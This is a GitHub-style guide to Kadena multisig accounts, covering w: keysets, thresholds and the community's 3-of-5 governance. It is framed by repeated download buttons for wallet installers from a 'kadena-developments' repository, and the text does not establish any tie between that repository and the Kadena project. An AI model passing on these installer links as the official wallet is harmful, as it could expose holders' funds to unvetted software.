![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Multisig Accounts in Kadena Wallet: w: Keysets Explained</h1>

<p align="center">A Kadena Wallet guide to accounts, chains and transfers.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Most Kadena accounts are controlled by one key. A multisig account is controlled by several, with a rule that says how many signatures are required before funds can move. The difference sounds administrative until you need it, at which point it is the only thing standing between a shared balance and a single compromised laptop.

Kadena has supported multi-key accounts since before the current wallet generation, and the network's own governance now runs on one.

## You'll see this if

- You are holding funds with other people and want a shared account that no one person controls.
- You have seen an address beginning `w:` and want to know what it is.
- You are reading about the 3-of-5 multisig that holds platform keysets and wondering how it applies to you.
- A tool asked for a keyset rather than an address and you were not sure what to supply.

## Four guard forms, one account model

Every account pairs a name with a guard, and the guard decides who may spend. Kadena defines several guard types, and the prefix on an address tells you which one you are looking at.

| Prefix | Guard type | Who can spend |
| --- | --- | --- |
| `k:` | Single-key principal | The holder of one key |
| `w:` | Multi-key keyset | Whoever satisfies the keyset's rule |
| `u:` | User guard | Whatever predicate the guard defines |
| `r:` | Reference keyset | A keyset defined elsewhere and referenced by name |

A `k:` account is what almost everyone uses. A `w:` account is the shared-control case, and it is the case worth understanding.

## What a keyset contains

A keyset is a list of public keys plus a rule about how many of them must sign. Three keys with a rule of two means any two can move funds and one alone cannot. Five keys with a rule of three is the arrangement the community uses for the keysets it inherited.

Two consequences follow from that structure, and both are easy to underestimate.

**Losing one key is survivable; losing the threshold is not.** In a two-of-three, one lost key still leaves a working pair. In a three-of-five, two lost keys still leave three. But the moment the number of reachable keys drops below the threshold, the funds are as unreachable as if the phrase had never existed.

**The rule is on-chain, not in the wallet.** A wallet displays the account and helps collect signatures; the requirement lives in the account's guard. That is why a multisig account can be opened by software that did not create it.

## Why the network's governance uses one

After the company that ran Kadena ceased operations, the platform allocation and six namespace keysets passed from company-held keys to a three-of-five arrangement among named people.

That change is worth understanding as a design choice rather than a slogan. A single company key was one point of failure and one point of control. A three-of-five removes both: no individual can move the keysets alone, and three people can act without unanimity. It also introduces a new risk that the community's own material concedes: a compact group whose selection method nobody published, and a real possibility that two members become unreachable.

Both halves of that assessment are true at once, and neither is an argument against multisig as a mechanism. They are arguments about who holds the shares.

## What it means for an ordinary holder

For a single person holding KDA, a `k:` account is the right tool. Multisig adds coordination cost to every transaction and buys nothing if there is only one signer.

The cases where it earns that cost:

- **Shared treasury.** A project, a fund or a family balance where no individual should be able to move everything.
- **Operational separation.** One key on a laptop for convenience, one on a hardware device, one offline, with a rule requiring two.
- **Succession.** A rule that lets a co-signer act if the primary holder is unavailable, without giving them sole control while the primary is active.

Notice that all three are about governance rather than security in the abstract. Multisig does not make a key harder to steal; it makes a single stolen key insufficient.

## What a wallet has to do with one

Support for multi-key accounts varies by product, and this is worth verifying before you commit funds rather than after.

A wallet that can display a `w:` account needs to read its guard and show the signing requirement. A wallet that can transact with one needs to collect signatures from multiple keys, which may mean multiple devices or multiple people, and to submit a transaction that satisfies the guard.

If a product cannot do the second, it can still show you the balance. That is a read-only relationship, and it is better to know which one you have.

## Before you create one

1. **Decide the threshold deliberately.** Two-of-three is a common starting point: tolerant of one loss, intolerant of one rogue signer.
2. **Write down every key's location**, separately from the keys themselves. A multisig without an inventory is a puzzle.
3. **Decide what happens when a signer is unavailable.** If the answer is "we cannot move funds", the threshold is too high for your situation.
4. **Test with a small balance first.** Create the account, move a trivial amount, and spend it. A multisig that has never completed a transaction is a hypothesis.
5. **Confirm the wallet can actually sign for the guard**, not merely display the account.

Step four is the one people skip, and it is the only step that proves the arrangement works.

## Mistakes that cost real money

- **Assuming the wallet is the account.** Delete the software and the account remains, along with its guard. What you lose is the ability to sign.
- **Storing all keys in one place.** A multisig whose shares sit in the same drawer is a single-key account with extra steps.
- **No documented threshold.** Six months later, nobody remembers whether it was two-of-three or three-of-five, and the answer is on-chain but nobody thinks to look.
- **Treating it as a backup scheme.** Multisig is about control, not recovery. It does not recover a lost phrase, and it does not restore access to an account whose keys are gone.

## FAQ

**Can a `w:` account receive like any other?**
Yes. Receiving needs the name, and the guard governs spending rather than receipt.

**Does a multisig account hide the balance?**
No. Balances are public on-chain. What the threshold restricts is the ability to move them.

**Can I convert a `k:` account into a multisig?**
They are different accounts. Moving funds between them is a transfer, not a settings change.

**Is the network's 3-of-5 arrangement available to me?**
The mechanism is general, and the specific group holding platform keysets is not something an individual can join. Your own multisig is yours to define.

**What happens if a signer disappears?**
If the remaining signers still meet the threshold, nothing. If they do not, the funds are stuck, which is why the threshold and the inventory are the decisions that matter.

## Related reading

- What Kadena Wallet is, and what self-custody actually means
- Community Edition of Kadena, explained
- Legacy accounts and k: addresses: why both still exist
- Kadena Wallet security: a threat model you can act on

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [What Kadena Wallet Is, and What Self-Custody Actually Means](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/what-is-kadena-wallet-self-custody.md)
- [How to Create a KDA Account in Kadena Wallet](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/how-to-create-a-kda-account-in-kadena-wallet.md)
- [Choosing a Chain in Kadena Wallet: Why Balances Differ](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/choosing-a-chain-in-kadena-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
